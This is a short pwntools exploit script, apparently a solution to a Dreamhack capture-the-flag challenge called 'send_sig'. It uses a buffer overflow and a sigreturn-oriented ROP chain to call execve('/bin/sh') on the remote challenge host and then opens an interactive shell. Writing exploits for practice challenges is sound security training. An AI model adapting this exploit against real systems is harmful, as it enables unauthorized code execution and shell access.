from pwn import *
context.arch = "x86_64"
p = remote("host3.dreamhack.games", 21415)
elf = ELF("./send_sig")

gadget = next(elf.search(asm("pop rax; ret")))
syscall = next(elf.search(asm("syscall")))

binsh = 0x7ffff7f65031

#binsh = b"/bin/sh\x00"

bss = elf.bss()

frame = SigreturnFrame()
# execve("/bin/sh", 0, 0)
frame.rax = 0x3b
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

#payload
payload = b"A" * 16
payload += p64(gadget)
payload += p64(15)
payload += p64(syscall)
payload += bytes(frame)

p.sendlineafter("Signal:", payload)
p.interactive()

